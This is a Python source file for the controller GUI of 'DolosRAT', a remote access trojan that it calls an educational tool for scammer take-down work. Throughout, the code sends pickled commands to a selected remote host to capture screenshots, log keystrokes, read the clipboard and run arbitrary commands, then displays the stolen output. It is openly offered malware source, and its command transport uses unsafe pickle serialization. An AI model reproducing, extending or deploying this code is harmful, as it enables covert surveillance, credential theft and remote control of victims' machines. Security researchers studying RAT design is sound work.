# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 24/06/2023
# version ='1.0'
# ---------------------------------------------------------------------------
# pylint: disable=import-error, syntax-error
# pyright: reportMissingModuleSource=false
"""
DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
techniques frequently used within scammer take-down operations. Please note that
the use of this tool is for educational purposes only.
"""

# Built-in/Generic Imports.
from io import BytesIO
from operator import attrgetter
from time import sleep
from typing import Any, List
from ipaddress import IPv4Address

# External Imports.
from PIL import Image, UnidentifiedImageError

# Modules.
from config.network import network_conf 
from utils.misc.encoder import Pickle
from utils.misc.threading import threadpooled
from utils.net.interface import IfaWrapper

@threadpooled
def _view_img(host_addr: IPv4Address, host_port: int) -> None:
    """_summary_
    """
    
    if img_data := IfaWrapper.get_host_attribute(host_addr, host_port, 'command_out'):
        try:
            Image.open(BytesIO(img_data), formats=['PNG']).show()
        except UnidentifiedImageError:
            pass

@threadpooled
def _send_command(top_level: object, command_str: str, args: List[Any] = []) -> None:
    """_summary_
    """
    
    host_addr, host_port = attrgetter(
        'ipv4_addr', 'port'
    )(network_conf.conf['selected_host'])
    
    pickled_command = Pickle.enc(network_conf.conf['commands'][command_str](args))

    IfaWrapper.edit_host(host_addr, host_port, 'command', pickled_command)
    IfaWrapper.edit_host(host_addr, host_port, 'command_name', command_str)

    match IfaWrapper.get_host_attribute(host_addr, host_port, 'command_name'): 
        case 'ScreenshotCommand':
            sleep(5)
            command_output = IfaWrapper.get_host_attribute(host_addr, host_port, 'command_out')
            _view_img(host_addr, host_port)
        case 'KeystrokeLogCommand':
            top_level.bottom_col_frame.frame_1.remove_text()
            top_level.bottom_col_frame.frame_1.add_text("Please wait for ~30s...")
            sleep(35)
            top_level.bottom_col_frame.frame_1.remove_text()
            if command_output := IfaWrapper.get_host_attribute(host_addr, host_port, 'command_out'):
                top_level.bottom_col_frame.frame_1.add_text(command_output.decode())
            else:
                top_level.bottom_col_frame.frame_1.remove_text()
        case 'ClipboardCommand':
            top_level.bottom_col_frame.frame_1.remove_text()
            top_level.bottom_col_frame.frame_1.add_text("Please wait...")
            sleep(5)
            top_level.bottom_col_frame.frame_1.remove_text()
            if command_output := IfaWrapper.get_host_attribute(host_addr, host_port, 'command_out'):
                top_level.bottom_col_frame.frame_1.add_text(command_output.decode())
            else:
                top_level.bottom_col_frame.frame_1.remove_text()
        case 'ExecuteCommand':
            top_level.bottom_col_frame.frame_1.remove_text()
            top_level.bottom_col_frame.frame_1.add_text("Please wait...")
            sleep(5)
            top_level.bottom_col_frame.frame_1.remove_text()
            if command_output := IfaWrapper.get_host_attribute(host_addr, host_port, 'command_out'):
                top_level.bottom_col_frame.frame_1.add_text(command_output.decode())
            else:
                top_level.bottom_col_frame.frame_1.remove_text()
        case _:
            pass
        
def btn_send_command_exec(top_level: object) -> None:
    """_summary_

    Args:
        top_level (object): _description_
    """
    
    host_addr, host_port = attrgetter(
        'ipv4_addr', 'port'
    )(network_conf.conf['selected_host'])
    
    command_str = top_level.add_command_dialog(host_addr, host_port)
    
    _send_command(top_level, 'ExecuteCommand', command_str)

    top_level.bottom_col_frame.set('Text View')

def btn_send_command_screenshot(top_level: object) -> None:
    """_summary_
    """
    
    _send_command(top_level, 'ScreenshotCommand')

    top_level.bottom_col_frame.set('Natural View')

def btn_send_command_keylog(top_level: object) -> None:
    """_summary_

    Args:
        top_level (object): _description_
    """
    
    _send_command(top_level, 'KeystrokeLogCommand')
    
    top_level.bottom_col_frame.set('Text View')
    
def btn_send_clipboard_keylog(top_level: object) -> None:
    """_summary_

    Args:
        top_level (object): _description_
    """
    
    _send_command(top_level, 'ClipboardCommand')
    
    top_level.bottom_col_frame.set('Text View')
